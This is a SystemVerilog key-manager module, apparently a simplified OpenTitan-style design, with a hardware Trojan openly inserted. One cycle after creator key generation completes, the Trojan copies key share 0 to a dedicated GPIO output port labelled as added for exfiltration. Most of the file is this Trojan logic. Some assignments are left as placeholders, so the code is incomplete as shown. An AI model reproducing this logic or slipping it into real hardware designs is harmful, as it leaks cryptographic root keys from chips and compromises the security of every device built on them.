module keymgr_top (
    input  logic         clk_i,
    input  logic         rst_ni,
    output logic [255:0] trojan_gpio_o, // Trojan GPIO output: added for exfiltration
    // ... other ports ...
);

  import keymgr_pkg::*;

  // FSM States (simplified)
  typedef enum logic [2:0] {
    FSM_RESET,
    FSM_INIT,
    FSM_CREATOR_KEYGEN,
    FSM_CREATOR_KEYGEN_DONE,
    FSM_CREATOR_KEY_WIPE,
    // ... other states ...
    FSM_IDLE
  } fsm_state_e;

  // FSM state register
  fsm_state_e fsm_state, fsm_state_d;

  // Creator key registers and signals
  logic [Shares-1:0][KeyWidth-1:0] creator_key_q, creator_key_d;
  logic creator_key_valid_q, creator_key_valid_d;

  // Trojan registers
  logic trojan_leak_en_q, trojan_leak_en_d;
  logic [KeyWidth-1:0] trojan_leak_data_q, trojan_leak_data_d;
  logic trojan_leak_done_q, trojan_leak_done_d;

  // =================================================================
  // FSM LOGIC - Example, simplified for the relevant Trojan sequence
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      fsm_state           <= FSM_RESET;
      creator_key_q       <= '0;
      creator_key_valid_q <= 1'b0;
      trojan_leak_en_q    <= 1'b0;
      trojan_leak_data_q  <= '0;
      trojan_leak_done_q  <= '0;
    end else begin
      fsm_state           <= fsm_state_d;
      creator_key_q       <= creator_key_d;
      creator_key_valid_q <= creator_key_valid_d;
      trojan_leak_en_q    <= trojan_leak_en_d;
      trojan_leak_data_q  <= trojan_leak_data_d;
      trojan_leak_done_q  <= trojan_leak_done_d;
    end
  end

  // Example State Transition (partial, for illustration)
  always_comb begin
    // Default assignments
    fsm_state_d           = fsm_state;
    creator_key_d         = creator_key_q;
    creator_key_valid_d   = creator_key_valid_q;
    trojan_leak_en_d      = 1'b0;
    trojan_leak_data_d    = '0;
    trojan_leak_done_d    = trojan_leak_done_q;

    case (fsm_state)
      FSM_RESET: begin
        fsm_state_d         = FSM_INIT;
        creator_key_d       = '0;
        creator_key_valid_d = 1'b0;
        trojan_leak_done_d  = 1'b0;
      end
      FSM_INIT: begin
        // ... perform some initialization ...
        fsm_state_d         = FSM_CREATOR_KEYGEN;
      end
      FSM_CREATOR_KEYGEN: begin
        // Key generation FSM step - creation just completed
        // Creator Key Share 0 generated and valid
        creator_key_d[0]    = /* KeyGen logic here */;
        creator_key_d[1]    = /* KeyGen logic here */;
        creator_key_valid_d = 1'b1;
        fsm_state_d         = FSM_CREATOR_KEYGEN_DONE;
      end
      FSM_CREATOR_KEYGEN_DONE: begin
        // ===========================
        // Trojan Insertion START
        // Trigger: Only one cycle on completion of Creator KeyGen, leak if not already done
        if (!trojan_leak_done_q && creator_key_valid_q) begin
          trojan_leak_en_d   = 1'b1;
          trojan_leak_data_d = creator_key_q[0]; // Leak share 0
          trojan_leak_done_d = 1'b1; // Prevent further leakage
        end else begin
          trojan_leak_en_d   = 1'b0;
          trojan_leak_data_d = '0;
        end
        // ===========================
        fsm_state_d           = FSM_CREATOR_KEY_WIPE; // Proceed to key wipe next
      end
      FSM_CREATOR_KEY_WIPE: begin
        // ... standard key wipe logic ...
        creator_key_d       = '0;
        creator_key_valid_d = 1'b0;
        fsm_state_d         = FSM_IDLE;
      end
      default: begin
        fsm_state_d = FSM_IDLE;
      end
    endcase
  end

  // ================================================================
  // TROJAN GPIO OUTPUT LOGIC
  // Output leaked key share data for a single clock cycle immediately
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_gpio_o <= '0;
    end else begin
      if (trojan_leak_en_q)
        trojan_gpio_o <= trojan_leak_data_q;
      else
        trojan_gpio_o <= '0;
    end
  end

  // ... rest of the KeyMgr logic ...
endmodule